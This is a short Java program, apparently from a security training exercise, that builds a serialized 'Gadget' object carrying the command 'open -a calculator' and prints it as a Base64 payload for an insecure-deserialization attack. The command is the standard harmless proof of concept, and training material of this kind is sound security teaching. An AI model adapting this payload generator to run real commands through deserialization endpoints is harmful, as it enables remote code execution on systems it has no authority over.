package cc;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;

import org.springframework.util.Base64Utils;

import com.mydomain.security.training.front.gadget.Gadget;

public class JavaSerialization {

	
	public static void main(String... args) throws Exception {
        serializeGadget();
	}
	
	private static void serializeGadget() throws Exception{
		Gadget g=new Gadget();
		g.setParam("open -a calculator");
		serialize(g);
	}
	
	private static void serialize(Object g) {
		ObjectOutputStream out1 = null;
		ByteArrayOutputStream baos=new ByteArrayOutputStream();
		try {
			out1=new ObjectOutputStream(baos);
			out1.writeObject(g);
			System.out.println(Base64Utils.encodeToString(baos.toByteArray()));
		} catch (Exception e) {
			System.out.println("Exception: " + e.toString());
		}

	}
}
